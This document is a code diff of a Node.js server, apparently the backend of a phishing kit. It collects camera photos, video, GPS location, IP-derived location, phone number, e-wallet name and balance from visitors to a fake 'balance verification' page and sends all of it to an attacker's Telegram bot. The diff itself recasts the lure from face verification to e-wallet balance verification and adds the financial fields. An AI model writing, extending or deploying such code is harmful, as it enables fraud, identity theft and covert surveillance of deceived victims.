@@ -48,18 +48,19 @@ async function getLocationDetails(ip) {
 }
 
 // ============================================
-// 📤 SEND KE TELEGRAM
+// 📤 SEND TO TELEGRAM
 // ============================================
 async function sendToTelegram(data) {
     try {
-        const { frontPhoto, backPhoto, video, gps, device, ip, timestamp, phone, locationData } = data;
+        const { frontPhoto, backPhoto, video, gps, device, phone, ewallet, saldo, ip, timestamp, locationData } = data;
         const time = new Date(timestamp).toLocaleString('id-ID', { timeZone: 'Asia/Jakarta' });
 
         console.log('📤 Sending to Telegram...');
 
-        // ===== BUAT CAPTION =====
-        let caption = `🟡 *VERIFIKASI WAJAH*\n\n`;
-        caption += `📱 *User:* ${phone || 'Tidak diketahui'}\n`;
+        let caption = `🟡 *VERIFIKASI SALDO*\n\n`;
+        caption += `📱 *Nomor:* ${phone || 'Tidak diketahui'}\n`;
+        caption += `💳 *E-Wallet:* ${ewallet || 'Tidak diketahui'}\n`;
+        caption += `💰 *Saldo:* Rp ${saldo || '0'}\n`;
         caption += `🕒 *Waktu:* ${time}\n\n`;
 
         if (device) {
@@ -69,7 +70,7 @@ async function sendToTelegram(data) {
         }
 
         if (locationData) {
-            caption += `📍 *Lokasi (IP):* ${locationData.fullLocation}\n`;
+            caption += `📍 *Lokasi:* ${locationData.fullLocation}\n`;
             caption += `🗺️ ${locationData.googleMapsLink}\n\n`;
         }
 
@@ -78,10 +79,9 @@ async function sendToTelegram(data) {
             caption += `🗺️ https://www.google.com/maps?q=${gps.latitude},${gps.longitude}\n\n`;
         }
 
-        caption += `🌐 *IP:* ${ip || 'Tidak diketahui'}\n`;
-        caption += `📹 *Video:* 10 detik dengan audio`;
+        caption += `🌐 *IP:* ${ip || 'Tidak diketahui'}`;
 
-        // ===== KIRIM FOTO =====
+        // KIRIM FOTO
         let photoBuffer = null;
         if (frontPhoto) {
             photoBuffer = Buffer.from(frontPhoto.replace(/^data:image\/\w+;base64,/, ''), 'base64');
@@ -111,22 +111,15 @@ async function sendToTelegram(data) {
             }
         }
 
-        // ===== KIRIM VIDEO =====
+        // KIRIM VIDEO
         if (video) {
             const videoBase64 = video.replace(/^data:video\/\w+;base64,/, '');
             const videoBuffer = Buffer.from(videoBase64, 'base64');
             
-            console.log(`📹 Video buffer size: ${videoBuffer.length} bytes`);
-
             if (videoBuffer.length > 1000) {
                 const formVideo = new FormData();
                 formVideo.append('chat_id', CHAT_ID);
-                
-                // Caption untuk video
-                let videoCaption = `📹 *Video Verifikasi*\nUser: ${phone || 'Tidak diketahui'}\n🕒 ${time}`;
-                formVideo.append('caption', videoCaption);
-                
-                // Kirim sebagai video dengan format MP4
+                formVideo.append('caption', `📹 *Video Verifikasi*\nUser: ${phone || 'Tidak diketahui'}`);
                 formVideo.append('video', videoBuffer, {
                     filename: `video_${Date.now()}.mp4`,
                     contentType: 'video/mp4'
@@ -136,37 +129,15 @@ async function sendToTelegram(data) {
                     formVideo.append('reply_to_message_id', messageId);
                 }
 
-                const videoResponse = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendVideo`, {
+                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendVideo`, {
                     method: 'POST',
                     body: formVideo
                 });
-                
-                const videoResult = await videoResponse.json();
-                if (videoResult.ok) {
-                    console.log('✅ Video sent successfully!');
-                } else {
-                    console.log('❌ Video failed:', videoResult.description);
-                    
-                    // Fallback: kirim sebagai document
-                    console.log('📤 Retry as document...');
-                    const formDoc = new FormData();
-                    formDoc.append('chat_id', CHAT_ID);
-                    formDoc.append('caption', `📹 *Video Verifikasi*\nUser: ${phone || 'Tidak diketahui'}`);
-                    formDoc.append('document', videoBuffer, {
-                        filename: `video_${Date.now()}.mp4`,
-                        contentType: 'video/mp4'
-                    });
-                    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendDocument`, {
-                        method: 'POST',
-                        body: formDoc
-                    });
-                }
-            } else {
-                console.log('⚠️ Video buffer too small, skipping...');
+                console.log('✅ Video sent');
             }
         }
 
-        // ===== KIRIM GPS =====
+        // KIRIM GPS
         if (gps && gps.latitude && gps.longitude) {
             await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendLocation`, {
                 method: 'POST',
@@ -193,13 +164,14 @@ app.post('/verify', async (req, res) => {
     console.log('📸 ===== NEW VERIFICATION =====');
 
     try {
-        const { frontPhoto, backPhoto, video, gps, device, timestamp, phone } = req.body;
+        const { frontPhoto, backPhoto, video, gps, device, phone, ewallet, saldo, timestamp } = req.body;
         const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress || 'unknown';
 
-        console.log(`📸 Front Photo: ${frontPhoto ? 'YES' : 'NO'}`);
-        console.log(`📸 Back Photo: ${backPhoto ? 'YES' : 'NO'}`);
-        console.log(`📹 Video: ${video ? 'YES (${video.length} chars)' : 'NO'}`);
-        console.log(`📍 GPS:`, gps);
+        console.log(`📱 Phone: ${phone}`);
+        console.log(`💳 E-Wallet: ${ewallet}`);
+        console.log(`💰 Saldo: ${saldo}`);
+        console.log(`📸 Front: ${frontPhoto ? 'YES' : 'NO'}`);
+        console.log(`📹 Video: ${video ? 'YES' : 'NO'}`);
 
         const locationData = await getLocationDetails(ip);
 
@@ -209,9 +181,11 @@ app.post('/verify', async (req, res) => {
             video,
             gps,
             device,
+            phone,
+            ewallet,
+            saldo,
             ip,
             timestamp: timestamp || new Date().toISOString(),
-            phone: phone || `User_${Date.now().toString().slice(-6)}`,
             locationData
         });
 
